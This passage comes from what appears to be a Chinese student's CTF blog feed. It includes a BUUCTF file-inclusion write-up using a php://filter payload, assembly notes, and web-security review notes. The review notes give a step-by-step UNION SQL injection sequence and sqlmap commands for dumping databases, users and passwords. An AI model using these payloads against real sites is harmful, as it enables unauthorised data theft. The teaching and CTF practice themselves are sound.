class="string">'flag&#123;1c5044a3-10a5-4073-8bc3-a56134196d35&#125;'</span>;</span><br><span class="line">                $secret = <span class="string">'jiAng_Luyuan_w4nts_a_g1rIfri3nd'</span></span><br><span class="line">            <span class="meta">?&gt;</span></span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<p>flag{1c5044a3-10a5-4073-8bc3-a56134196d35}</p>
<h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p><a href="http://2fe69fec-e36f-470f-8434-0e32a3761d6b.node3.buuoj.cn" target="_blank" rel="noopener">http://2fe69fec-e36f-470f-8434-0e32a3761d6b.node3.buuoj.cn</a></p>
<p>根据网址 /?file=flag.php</p>
<p>想到文件包含,先伪协议读一波源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
<p>解base64后<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Can you find out the flag?"</span>;</span><br><span class="line"><span class="comment">//flag&#123;ba49b5dd-32ae-45f4-8fce-ea258e0807ca&#125;</span></span><br></pre></td></tr></table></figure></p>
<p>flag{ba49b5dd-32ae-45f4-8fce-ea258e0807ca}</p>
]]></content>
      
        <categories>
            
            <category> ctf writeup web </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 个人ctf竞赛 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[GINKGO大废物杯_wp]]></title>
      <url>/ctf-writeup/ckwd5ws7n0026d0uc1diu2rks/</url>
      <content type="html"><![CDATA[<p>pdf插件加载比较慢,请稍等一下下哈<br>

	<div class="row">
    <embed src="GINKGO大废物杯_wp.pdf" width="100%" height="550" type="application/pdf">
	</div>


</p>
]]></content>
      
        <categories>
            
            <category> ctf writeup </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 个人ctf竞赛 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Ginkgo废物杯_web1高地_复现]]></title>
      <url>/ctf-writeup-web/ckwd5ws7p0029d0ucqh7urqth/</url>
      <content type="html"><![CDATA[<p>pdf插件加载比较慢,请稍等一下下哈<br>

	<div class="row">
    <embed src="Ginkgo废物杯_web1高地_复现.pdf" width="100%" height="550" type="application/pdf">
	</div>


</p>
]]></content>
      
        <categories>
            
            <category> ctf writeup web </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 个人ctf竞赛 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[2020GACTF_misc复现]]></title>
      <url>/ctf-writeup-misc/ckwd5ws6r000ud0ucsbgfx70j/</url>
      <content type="html"><![CDATA[<p>pdf插件加载比较慢,请稍等一下下哈<br>

	<div class="row">
    <embed src="2020GACTF_misc复现.pdf" width="100%" height="550" type="application/pdf">
	</div>


</p>
]]></content>
      
        <categories>
            
            <category> ctf writeup misc </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 个人ctf竞赛 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[FCTF_wp]]></title>
      <url>/ctf-writeup/ckwd5ws7g001ud0ucknf8uc0j/</url>
      <content type="html"><![CDATA[<p>pdf插件加载比较慢,请稍等一下下哈<br>

	<div class="row">
    <embed src="FCTF_wp.pdf" width="100%" height="550" type="application/pdf">
	</div>


</p>
]]></content>
      
        <categories>
            
            <category> ctf writeup </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 个人ctf竞赛 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[2020DozerCTF_wp_by_ginkgo_三叶草]]></title>
      <url>/ctf-writeup/ckwd5ws6k000md0uclltslgm7/</url>
      <content type="html"><![CDATA[<p>pdf插件加载比较慢,请稍等一下下哈<br>

	<div class="row">
    <embed src="2020_DozerCTF_wp_by_ginkgo_三叶草.pdf" width="100%" height="550" type="application/pdf">
	</div>


</p>
]]></content>
      
        <categories>
            
            <category> ctf writeup </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 团队ctf竞赛 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[第五周课堂笔记(汇编)]]></title>
      <url>/%E7%AC%94%E8%AE%B0/ckwd5wsay006sd0ucq37md66i/</url>
      <content type="html"><![CDATA[<h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><p>主要寄存器:(32位)<br>EAX EBX ECX EDX:数据寄存器<br>ESI EDI:变址寄存器<br>ESP:指向栈顶<br>EBP:指向栈底<br>EIP:指向指令执行的下一条地址</p>
<p>R(64位)</p>
<p>（以上也是在栈中的位置顺序）</p>
<h2 id="常见的汇编指令"><a href="#常见的汇编指令" class="headerlink" title="常见的汇编指令"></a>常见的汇编指令</h2><p>mov eax,0x12  将0x12覆盖的存入eax<br>mov eax,ebx   将ebxd的值覆盖的存入eax<br>add eax，ebx  将ebx+eax并覆盖的存入eax<br>inc eax       eax++<br>edc eax       eax–</p>
<h2 id="PUSH"><a href="#PUSH" class="headerlink" title="PUSH"></a>PUSH</h2><p>push指令将操作数压入内存的栈中<br>个人理解：栈结构不变，push数据（压栈）前，先将esp值减4，再将操作数内容压入esp指示的位置，再自行+4恢复到栈顶位置<br>push eax    将eax内容压栈<br>push [var]  将var指示的4直接内容压栈</p>
<h2 id="POP"><a href="#POP" class="headerlink" title="POP"></a>POP</h2><p>pop指令与push指令相反,执行出栈工作<br>个人理解：栈结构不变，pop数据（出栈）前，先将esp指示地址中的内容出栈，然后esp值+4恢复栈顶位置<br>pop edi    将edi内容出栈<br>pop [ebx]  将ebx指示的4直接内容出栈</p>
<h2 id="CALL"><a href="#CALL" class="headerlink" title="CALL"></a>CALL</h2><p>call指令实现子程序的调用<br>个人理解：call指令先将当前执行指令地址入栈，然后无条件转移到由标签指示的指令，但依旧保存调用前的地址信息，当调用结束后返回到调用前的地址</p>
<h2 id="RET"><a href="#RET" class="headerlink" title="RET"></a>RET</h2><p>ret指令实现子程序的返回<br>个人理解：ret指令弹出栈中保存的指令地址，然后无条件转移到保存的指令地址执行，等待下一次返回数据</p>
<h2 id="调用约定画图理解"><a href="#调用约定画图理解" class="headerlink" title="调用约定画图理解"></a>调用约定画图理解</h2><figure class="image-box">
                <img src="./pwn_pic.png" alt title class>
                <p></p>
            </figure>
<p>(以下纯个人理解,有不对的地方虚心听教)</p>
<p>main函数里定义A子程序,并赋值1,2,3,A子程序里返回a+b+c的值<br>old ebp是原栈底,一个保存原栈底地址的寄存器,内容可变结构不变<br>ret add返回由1,2,3赋值后的a+b+c,当有值被定义时就返回值,地址位置自行变化,功能不变<br>mov ebp,esp,有新内容进来,一个入栈过程,将ebp的地址转移到esp<br>leave,一个出栈过程,mov esp,ebp,将栈顶地址转移到栈底,pop出来一个ebp地址的内容,但因为已经将esp地址转移到ebp,所以pop ebp的内容依旧是在出栈,retn返回出栈的值</p>
]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[第一周复习(WEB)]]></title>
      <url>/%E7%AC%94%E8%AE%B0/ckwd5wsat006nd0uc6dwo59n2/</url>
      <content type="html"><![CDATA[<p>线上分享第一周主要以复习为主，在家估计都把原来学的忘的差不多了，所有人各个方向，这周提前复习一下HTTP协议（传参类型、常用伪造形式、各个文件头的大概作用、burp/postman/hackbar工具熟悉使用）html基础（web页面、常用标签、自己编写内容）、sql基础（mysql语言学习、增删改查、联合查询的方式、基础的sql注入点挖掘、sqlmap使用）这些内容提前复习，在分享会时候会让各位都进行实操和讲解，对不会的地方进行详细讲解，保证大部分人的时间不浪费</p>
<h2 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h2><h3 id="传参类型"><a href="#传参类型" class="headerlink" title="传参类型"></a>传参类型</h3><p>GET POST(辅助工具 hackbar burpsuite postman)</p>
<h3 id="常用伪造形式"><a href="#常用伪造形式" class="headerlink" title="常用伪造形式"></a>常用伪造形式</h3><p>X-Forwarded-For： 伪造请求的ip</p>
<p>User-Agent: 伪造应用信息</p>
<p>Accept-Language: 伪造请求语言</p>
<p>Host： 伪造请求的服务器的ip</p>
<p>GET/POST: 伪造发包方式</p>
<h3 id="常见攻击形式"><a href="#常见攻击形式" class="headerlink" title="常见攻击形式"></a>常见攻击形式</h3><p>跨站脚本攻击(XSS) 跨站请求伪造攻击(CSRF) Http Heads攻击 Cookie攻击 重定向攻击</p>
<h3 id="数据包文件头的作用"><a href="#数据包文件头的作用" class="headerlink" title="数据包文件头的作用"></a>数据包文件头的作用</h3><h4 id="通用头部"><a href="#通用头部" class="headerlink" title="通用头部"></a>通用头部</h4><p>Request URL: 请求地址</p>
<p>Request Method: 请求方式（get post put delete trace header）</p>
<p>Status Code: 200 (状态码和原因短语)</p>
<p>Remote Address: 127.0.0.1:80 （请求ip）</p>
<p>Referrer Policy: no-referrer-when-downgrade(是否有代理)</p>
<h4 id="响应头部"><a href="#响应头部" class="headerlink" title="响应头部"></a>响应头部</h4><p>Connection: 连接</p>
<p>Content-Type: application/json;charset=UTF-8（内容类型）</p>
<p>Date: Mon, 24 Jun 2019 11:12:18 GMT（做出响应的时间）</p>
<p>Server: nginx/1.13.6 （服务器类型）</p>
<p>Transfer-Encoding: chunked （消息首部指明将信息安全传递给用户所采用的编码形）</p>
<h4 id="请求头部"><a href="#请求头部" class="headerlink" title="请求头部"></a>请求头部</h4><p>Accept: application/json, text/plain, / （接收类型）</p>
<p>Accept-Encoding: gzip, deflate （接收压缩内容使用的编码）</p>
<p>Accept-Language: zh-CN,zh;q=0.9 （接收语言）</p>
<p>Connection: keep-alive （连接成功）</p>
<p>Cookie: JSESSIONID=0AC68B437A980871D1E6C4479DCCF965 (COOKIE信息)</p>
<p>Host: <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> （响应主机域名）</p>
<p>Referer: <a href="http://www.baidu.com" target="_blank" rel="noopener">http://www.baidu.com</a> (响应地址)</p>
<p>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36 （浏览器应用信息)</p>
<h4 id="实体头部包含发出请求的参数信息"><a href="#实体头部包含发出请求的参数信息" class="headerlink" title="实体头部包含发出请求的参数信息."></a>实体头部包含发出请求的参数信息.</h4><h3 id="burp-postman-hackbar工具熟悉使用"><a href="#burp-postman-hackbar工具熟悉使用" class="headerlink" title="burp/postman/hackbar工具熟悉使用"></a>burp/postman/hackbar工具熟悉使用</h3><h4 id="burpsuite常用功能"><a href="#burpsuite常用功能" class="headerlink" title="burpsuite常用功能"></a>burpsuite常用功能</h4><p>proxy:抓包</p>
<p>spider:爬虫</p>
<p>intruder:爆破密码</p>
<p>repeater:发包改包</p>
<p>extender:添加插件</p>
<h4 id="postman"><a href="#postman" class="headerlink" title="postman"></a>postman</h4><figure class="image-box">
                <img src="https://img-blog.csdn.net/20180523232921542?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Z4YmluMTIz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt title class>
                <p></p>
            </figure>
<p><a href="https://blog.csdn.net/fxbin123/article/details/80428216" target="_blank" rel="noopener">详细使用</a></p>
<h4 id="hackbar"><a href="#hackbar" class="headerlink" title="hackbar"></a>hackbar</h4><p>有多种注入方式可用xss,sql等,支持get,post传参,带http协议头传参等.</p>
<h2 id="html基础"><a href="#html基础" class="headerlink" title="html基础"></a>html基础</h2><h3 id="web页面"><a href="#web页面" class="headerlink" title="web页面"></a>web页面</h3><p>随便找一个页面都能说.</p>
<h3 id="常用标签"><a href="#常用标签" class="headerlink" title="常用标签"></a>常用标签</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;&lt;head&gt;&lt;meta&gt;&lt;link&gt;&lt;title&gt;&lt;body&gt;&lt;div&gt;&lt;textarea&gt;&lt;span&gt;等</span><br></pre></td></tr></table></figure>
<h3 id="自己编写内容"><a href="#自己编写内容" class="headerlink" title="自己编写内容"></a>自己编写内容</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"header"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"./index.html#onepage"</span>&gt;</span>新番资讯<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#twopage"</span>&gt;</span>我的追番<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"./threepage.html#threepage"</span>&gt;</span>番剧推荐<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"move"</span>&gt;</span> <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 动漫资讯 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"contain"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"sildeInput"</span> <span class="attr">value</span>=<span class="string">"1"</span> <span class="attr">id</span>=<span class="string">"Input1"</span> <span class="attr">hidden</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"label1"</span> <span class="attr">for</span>=<span class="string">"Input1"</span>&gt;</span>1<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"sildeInput"</span> <span class="attr">value</span>=<span class="string">"1"</span> <span class="attr">id</span>=<span class="string">"Input2"</span> <span class="attr">hidden</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"label2"</span> <span class="attr">for</span>=<span class="string">"Input2"</span>&gt;</span>2<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"sildeInput"</span> <span class="attr">value</span>=<span class="string">"0"</span> <span class="attr">id</span>=<span class="string">"Input3"</span> <span class="attr">hidden</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"label3"</span> <span class="attr">for</span>=<span class="string">"Input3"</span>&gt;</span>3<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"./images/bg.jpg"</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"./images/bg.jpg"</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"./images/bg.jpg"</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="sql基础"><a href="#sql基础" class="headerlink" title="sql基础"></a>sql基础</h2><h3 id="mysql语言学习"><a href="#mysql语言学习" class="headerlink" title="mysql语言学习"></a>mysql语言学习</h3><h4 id="最常用的显示命令"><a href="#最常用的显示命令" class="headerlink" title="最常用的显示命令"></a>最常用的显示命令</h4><p>1、显示数据库列表:</p>
<p>show databases;</p>
<p>2、显示库中的数据表：</p>
<p>use mysql;</p>
<p>show tables;</p>
<p>3、显示数据表的结构：</p>
<p>describe 表名;</p>
<p>4、建库：</p>
<p>create database 库名;</p>
<p>5、建表：</p>
<p>use 库名；</p>
<p>create table 表名;</p>
<p>6、删库和删表:</p>
<p>drop database 库名;</p>
<p>drop table 表名;</p>
<p>7、将表中记录清空：</p>
<p>delete from 表名;(清空数据表内容,保留自增id,可恢复)</p>
<p>truncate table 表名;（成功则返回0,自增id也一同会被清掉,不可恢复）</p>
<p>8、显示表中的记录：</p>
<p>select * from 表名;</p>
<p>9、显示当前的user：</p>
<p>SELECT USER();</p>
<h4 id="连接MySQL"><a href="#连接MySQL" class="headerlink" title="连接MySQL"></a>连接MySQL</h4><p>格式: mysql -h 主机地址 -u用户名 -p用户密码</p>
<p>退出MYSQL命令： exit （回车）</p>
<h4 id="修改新密码"><a href="#修改新密码" class="headerlink" title="修改新密码"></a>修改新密码</h4><p>方法一<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use mysql;</span><br><span class="line">update user set password=PASSWORD(&apos;新密码&apos;) where user=&apos;用户名&apos;;</span><br><span class="line">flush privileges; #有关用户变动的都需要更新权限</span><br><span class="line">quit; #退出</span><br></pre></td></tr></table></figure></p>
<p>方法二</p>
<p>格式：mysqladmin -u用户名 -p旧密码 password 新密码</p>
<h4 id="增加新用户"><a href="#增加新用户" class="headerlink" title="增加新用户"></a>增加新用户</h4><p>格式：grant select on 数据库.* to 用户名@登录主机 identified by “密码”</p>
<p>如增加一个用户test2密码为abc,让他只可以在localhost上登录,并可以对数据库mydb进行查询、插入、修改、删除的操作（localhost指本地主机,即MYSQL数据库所在的那台主机）,这样用户即使用知道test2的密码也无法从internet上直接访问数据库,只能通过MYSQL主机上的web页来访问.</p>
<p>grant select,insert,update,delete on mydb.* to test2@localhost identified by “abc”;</p>
<h4 id="删除用户"><a href="#删除用户" class="headerlink" title="删除用户"></a>删除用户</h4><p>格式: delete from user where user=’用户名’ and host=’localhost’;</p>
<p>删除用户的数据库: drop database dbname;</p>
<h3 id="增删改查"><a href="#增删改查" class="headerlink" title="增删改查"></a>增删改查</h3><h4 id="增"><a href="#增" class="headerlink" title="增"></a>增</h4><p>命令:alter table 表名 add 字段 类型 其他;</p>
<p>alter table MyClass add passtest int(4) default ‘0’</p>
<h4 id="删"><a href="#删" class="headerlink" title="删"></a>删</h4><p>命令:delete from 表名 where 表达式</p>
<p>delete from MyClass where id=1;</p>
<h4 id="改"><a href="#改" class="headerlink" title="改"></a>改</h4><p>命令:update 表名 set 字段=新值,… where 条件</p>
<p>update MyClass set name=’Mary’ where id=1;</p>
<h4 id="查"><a href="#查" class="headerlink" title="查"></a>查</h4><p>查询所有行</p>
<p>mysql&gt; select * from MyClass;</p>
<p>查询前几行数据</p>
<p>mysql&gt; select * from MyClass order by id limit 0,2;</p>
<h3 id="联合查询的方式"><a href="#联合查询的方式" class="headerlink" title="联合查询的方式"></a>联合查询的方式</h3><h4 id="联合查询的注意事项"><a href="#联合查询的注意事项" class="headerlink" title="联合查询的注意事项:"></a>联合查询的注意事项:</h4><p>1.两个查询语句的查询结果中的列类型要一样。</p>
<p>2.两个查询语句的查询结果中的列的数量要相同。</p>
<p>3.两个查询语句的查询结果中的列名可以不一致，如果没有特定指定，按照第一个查询语句的列名来显示。</p>
<h4 id="联合注入的过程"><a href="#联合注入的过程" class="headerlink" title="联合注入的过程"></a>联合注入的过程</h4><p>1.判断注入点   ?id=1 and 1=1  ?id=1’</p>
<p>2.判断是整型还是字符型   ?id=1 and 1=1/1=2%23</p>
<p>3.判断查询列数  ?id=1’ order by 4%23</p>
<p>4.判断显示位  ?id=-1’ union select 1,2,3%23</p>
<p>5.获取所有数据库名<br>?id=-1’ union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)%23</p>
<p>6.获取数据库所有表名<br>?id=-1’ union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=’security’),3%23</p>
<p>7.获取列名<br>?id=-1’ union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=’security’ and table_name=’users’),3%23</p>
<p>8.获取字段名<br>?id=-1’ union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 1,1),3%23 </p>
<h3 id="基础的sql注入点挖掘"><a href="#基础的sql注入点挖掘" class="headerlink" title="基础的sql注入点挖掘"></a>基础的sql注入点挖掘</h3><p>1.单引号判断  ?id=1’</p>
<p>2.数字型判断  ?id=1 and 1=1/1=2  id=123-1</p>
<p>3.字符型判断  ?id=1’ and ‘1’=’1/2</p>
<p>4.文本型判断  ?id=123’%2B’asdf</p>
<p>5.输入框判断  #@!$/ …</p>
<h3 id="sqlmap使用"><a href="#sqlmap使用" class="headerlink" title="sqlmap使用"></a>sqlmap使用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u url --dbs //爆数据库</span><br><span class="line">sqlmap.py -u url --current-db //爆当前库</span><br><span class="line">sqlmap.py -u url --current-user //爆当前用户</span><br><span class="line">sqlmap.py -u url --users   查看用户权限</span><br><span class="line">sqlmap.py -u url --tables -D 数据库 //爆表段</span><br><span class="line">sqlmap.py -u url --columns -T 表段 -D 数据库 //爆字段</span><br><span class="line">sqlmap.py -u url --dump -C 字段 -T 表段 -D 数据库 //猜解</span><br><span class="line">sqlmap.py -u url --dump --start=1 --stop=3 -C 字段 -T 表段 -D 数据库 //猜解1到3的字段</span><br><span class="line"></span><br><span class="line">sqlmap.py -u url  判断</span><br><span class="line">sqlmap.py -u url --is-dba -v   这是判断当前数据库的使用者是否是dba</span><br><span class="line">sqlmap.py -u url --users -v 0  这句的目的是列举数据库的用户</span><br><span class="line">sqlmap.py -u url --passwords -v 0 这句的目的是获取数据库用户的密码</span><br><span class="line">sqlmap.py -u url --privileges -v 0 这是判断当前的权限</span><br><span class="line">sqlmap.py -u url --dbs -v 0 这句的目的是将所有的数据库列出来</span><br><span class="line">sqlmap.py -u url --tables -D &apos;表&apos; 爆表</span><br><span class="line">sqlmap.py -u url --columns -T ‘表’-D ‘数据库’爆列</span><br><span class="line">sqlmap.py -u url --dump -T &apos;表&apos; --start 1 --stop 4 -v 0 这里是查询第2到第4行的内</span><br><span class="line">sqlmap.py -u url --dump -all -v 0</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> WEB知识 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[第四周两道题wp(SQL注入)]]></title>
      <url>/ctf-writeup/ckwd5wsb0006vd0ucpbp9czql/</url>
      <content type="html"><![CDATA[<p>pdf插件加载比较慢,请稍等一下下哈<br>

	<div class="row">
    <embed src="第四周两道题wp(SQL注入).pdf" width="100%" height="550" type="application/pdf">
	</div>


</p>
]]></content>
      
        <categories>
            
            <category> ctf writeup </category>
            
        </categories>
        
        
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[第二周四道题wp(代码审计)]]></title>
      <url>/ctf-writeup/ckwd5wsa5005ud0ucugo2mqax/</url>
      <content type="html"><![CDATA[<p>pdf插件加载比较慢,请稍等一下下哈<br>

	<div class="row">
    <embed src="第二周四道题wp.pdf" width="100%" height="550" type="application/pdf">
	</div>


</p>
]]></content>
      
        <categories>
            
            <category> ctf writeup </category>
            
        </categories>
        
        
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[2020高校战疫CTF wp]]></title>
      <url>/ctf-writeup/ckwd5ws6f000id0ucwxhcfn7m/</url>
      <content type="html"><![CDATA[<p>pdf插件加载比较慢,请稍等一下下哈<br>

	<div class="row">
    <embed src="2020高校战疫CTF__wp.pdf" width="100%" height="550" type="application/pdf">
	</div>


</p>
]]></content>
      
        <categories>
            
            <category> ctf writeup </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 个人ctf竞赛 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[GXYCTF writeup Mini_Ginkgo]]></title>
      <url>/ctf-writeup/ckwd5ws7u002fd0ucqhp65ehz/</url>
      <content type="html"><![CDATA[<p>pdf插件加载比较慢,请稍等一下下哈<br>

	<div class="row">
    <embed src="GXYCTF_writeup_Mini_Ginkgo.pdf" width="100%" height="550" type="application/pdf">
	</div>


</p>
]]></content>
      
        <categories>
            
            <category> ctf writeup </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 团队ctf竞赛 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[XCTF攻防世界刷题(WEB部分)(高手进阶区)(简单部分)]]></title>
      <url>/ctf-writeup-web/ckwd5ws8t003zd0ucbp6timsx/</url>
      <content type="html"><![CDATA[<p>pdf插件加载比较慢,请稍等一下下哈<br>

	<div class="row">
    <embed src="XCTF攻防世界刷题(WEB部分)(高手进阶区)(简单部分).pdf" width="100%" height="550" type="application/pdf">
	</div>


</p>
]]></content>
      
        <categories>
            
            <category> ctf writeup web </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 个人ctf竞赛 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[XCTF攻防世界刷题(WEB部分)(新手区)]]></title>
      <url>/ctf-writeup-web/ckwd5ws8p003sd0uc4nvh1d1c/</url>
      <content type="html"><![CDATA[<p>pdf插件加载比较慢,请稍等一下下哈<br>

	<div class="row">
    <embed src="XCTF攻防世界刷题(WEB部分)(新手区).pdf" width="100%" height="550" type="application/pdf">
	</div>


</p>
]]></content>
      
        <categories>
            
            <category> ctf writeup web </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 个人ctf竞赛 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[NCTF2019 wp]]></title>
      <url>/ctf-writeup/ckwd5ws84002wd0uct5hcnnn8/</url>
      <content type="html"><![CDATA[<p>pdf插件加载比较慢,请稍等一下下哈<br>

	<div class="row">
    <embed src="NCTF2019_wp.pdf" width="100%" height="550" type="application/pdf">
	</div>


</p>
]]></content>
      
        <categories>
            
            <category> ctf writeup </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 团队ctf竞赛 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[2019年终总结]]></title>
      <url>/%E6%97%A5%E5%B8%B8/ckwd5ws60000bd0uc4p5aktwm/</url>
      <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">该文章已加密, 请输入密码查看。</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="e423d2a9fff216108f9c6df5170cc2d69bc8deeae139ae20eb195c296dac5b73"></script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
        <categories>
            
            <category> 日常 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 年终总结 </tag>
            
        </tags>
        
    </entry>
